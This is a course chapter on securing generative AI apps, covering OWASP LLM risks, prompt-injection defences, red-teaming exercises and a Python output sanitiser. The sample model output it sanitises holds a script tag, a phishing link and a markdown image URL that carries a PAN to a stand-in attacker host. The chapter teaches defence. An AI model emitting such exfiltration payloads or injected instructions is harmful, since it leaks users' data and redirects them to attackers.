title: 07 — Generative AI Security
html:
07 — Generative AI Security

The one idea: treat the model as a powerful but gullible component. Everything it reads may be an attack, and everything it writes is untrusted input to whatever comes next. Security comes from limiting what it can reach and checking what flows in and out, not from asking it nicely in the prompt.

1. What it is

The threat lists to know (details in Securing Agents and MCP Tools):

  • OWASP Top 10 for LLM Applications 2025:
    • LLM01 Prompt Injection
    • LLM02 Sensitive Information Disclosure
    • LLM03 Supply Chain
    • LLM04 Data and Model Poisoning
    • LLM05 Improper Output Handling
    • LLM06 Excessive Agency
    • LLM07 System Prompt Leakage
    • LLM08 Vector and Embedding Weaknesses
    • LLM09 Misinformation
    • LLM10 Unbounded Consumption
  • OWASP Top 10 for Agentic Applications 2026: agent-specific risks such as goal hijacking, tool misuse, identity and privilege abuse, memory poisoning and cascading failures.

2. Why it matters

  • Chatbots leak data through retrieval that ignores permissions, or through clever prompts.
  • Rendered output can attack users. Scripts, phishing links, and images whose URLs carry data out.
  • Agents with tools turn a text attack into an action.

3. The main ideas

3.1 Threat model by surface

---
title: Where attacks enter and leave a generative AI app
---
flowchart LR
    U["User input"] -- "direct injection,<br/>jailbreaks" --> APP["App + model"]
    D["Retrieved docs, web pages,<br/>emails, tool output"] -- "indirect injection,<br/>poisoning" --> APP
    APP -- "tool calls" --> T["Tools and data<br/>(excessive agency)"]
    APP -- "output" --> R["UI, SQL, shell, email<br/>(improper output handling)"]
    APP -- "answers" --> L["Data leakage<br/>(PII, other users, system prompt)"]
    APP -- "runaway loops" --> C["Cost and rate abuse"]

3.2 Controls

Layer Controls Tools (checked 2026-10-27)
Input Classify prompts for attacks, limit length and topics, label untrusted content Azure AI Content Safety Prompt Shields (detects user-prompt and document attacks), Llama Guard (open safety classifier), NeMo Guardrails (programmable rails, with Llama Guard integration)
Retrieval Enforce the user's permissions at retrieval time, index only approved sources, separate tenants Row filters and ACLs in the search index, or in Unity Catalog
Tools and agency Least privilege, read-only by default, human approval for side effects, pinned tool definitions 04, 05
Output Escape before rendering, allow-list links, drop images, mask PII, validate SQL and JSON Your code (section 4), plus output classifiers
Secrets Never in prompts. Keys in a vault. The system prompt holds no secrets, because it can leak Azure Key Vault, managed identity
Consumption Per-user rate limits, token budgets, timeouts, a kill switch API gateway, app limits
Assurance Red teaming before release and on every change promptfoo (open-source evaluations and red teaming, MIT licensed, which joined OpenAI in March 2026 per its README), plus manual testing

Layering costs something: each extra classifier adds latency and false positives. A regular expression runs in microseconds, and an LLM judge can take seconds. Measure the combined false-positive rate.

3.3 Prompt injection: what works

  1. Assume some will get through. Design so that a successful injection can't do much: least privilege and approvals.
  2. Separate and label untrusted content (spotlighting: delimit it, say where it came from, tell the model it is data).
  3. Detect obvious attacks on input and on retrieved documents.
  4. Never let retrieved content choose tools or arguments on its own.

4. Working code

The script renders model output safely. It drops markdown images (which can carry data out through their URLs), keeps only allow-listed links, masks PAN, email and phone numbers, and HTML-escapes the rest. Standard library only.

import html, re
from urllib.parse import urlparse

# Treat model output as untrusted input to the next system (OWASP LLM05: improper output handling).
model_output = (
    "Your NAV statement is ready. <script>steal()</script> See [the factsheet](https://docs.example.com/f.pdf) "
    "or [click here](https://evil.example.net/login). ![chart](https://evil.example.net/p.png?d=ABCDE1234F) "
    "Contact R. Sharma at r.sharma@example.com or +91-9876543210. PAN ABCDE1234F."
)
ALLOWED_LINK_HOSTS = {"docs.example.com"}
PAN = re.compile(r"\b[A-Z]{5}\d{4}[A-Z]\b")
EMAIL = re.compile(r"\b[\w.+-]+@[\w-]+\.[\w.]+\b")
PHONE = re.compile(r"\+?\d{2}[- ]?\d{10}\b")

def safe_render(text):
    findings = []
    # 1. Images: a markdown image URL is fetched by the browser automatically, so it can leak data. Drop them.
    def drop_image(m):
        findings.append(f"image removed ({urlparse(m.group(2)).hostname})"); return "[image removed]"
    text = re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", drop_image, text)
    # 2. Links: keep only allow-listed hosts.
    def check_link(m):
        host = urlparse(m.group(2)).hostname
        if host in ALLOWED_LINK_HOSTS:
            return m.group(0)
        findings.append(f"link removed ({host})"); return m.group(1)
    text = re.sub(r"\[([^\]]+)\]\(([^)]+)\)", check_link, text)
    # 3. Personal data the user should not see in this channel.
    for name, rx in (("PAN", PAN), ("email", EMAIL), ("phone", PHONE)):
        text, n = rx.subn(f"[{name} masked]", text)
        if n: findings.append(f"{n} {name} masked")
    # 4. Escape what is left, so no markup or script can run in the page.
    return html.escape(text), findings

rendered, findings = safe_render(model_output)
print(rendered)
print("findings:", findings)

Output:

Your NAV statement is ready. <script>steal()</script> See [the factsheet](https://docs.example.com/f.pdf) or click here. [image removed] Contact R. Sharma at [email masked] or [phone masked]. PAN [PAN masked].
findings: ['image removed (evil.example.net)', 'link removed (evil.example.net)', '1 PAN masked', '1 email masked', '1 phone masked']

What to notice:

  • The image URL carried a PAN in its query string. A browser would have sent it to evil.example.net just by displaying the image. Dropping images (or proxying only allow-listed ones) closes that channel.
  • The phishing link keeps its text but loses its URL. The allow-listed factsheet link survives.
  • <script> is escaped, so it displays as text and never runs.

5. Common mistakes

  1. Security by system prompt. "Never reveal X" is not access control.
  2. Retrieval that ignores the user's permissions. The bot then reads other people's documents to them.
  3. Rendering model output as HTML or markdown without sanitising.
  4. Secrets or internal URLs in the system prompt.
  5. No red-team suite in CI. Defences regress silently.

6. Exercise (1.5 hours)

  1. Extend the script to block javascript: links, and to mask 12-digit account numbers.
  2. Write ten red-team prompts for a fund-support bot (asking for other clients' data, asking for advice, injected instructions inside a "document"), and run them against your bot.
  3. If you can install promptfoo, put those prompts into a red-team config and run it.

7. Questions to test yourself

  1. What is indirect prompt injection, and where does it come from?
  2. Why are markdown images dangerous in chat output?
  3. Where must permission checks happen in a RAG chatbot?
  4. Why is a system prompt not a place for secrets?
  5. What do Prompt Shields detect?

Answers

  1. Instructions hidden in content the model reads: documents, web pages, emails, tool results.
  2. The browser fetches the image URL automatically, which can send data in the URL to an attacker.
  3. At retrieval time, using the end user's identity, before any document reaches the model.
  4. System prompts can be extracted (OWASP LLM07), so anything in them must be safe to reveal.
  5. Attacks in user prompts (jailbreaks) and in documents (indirect attacks).

8. Sources
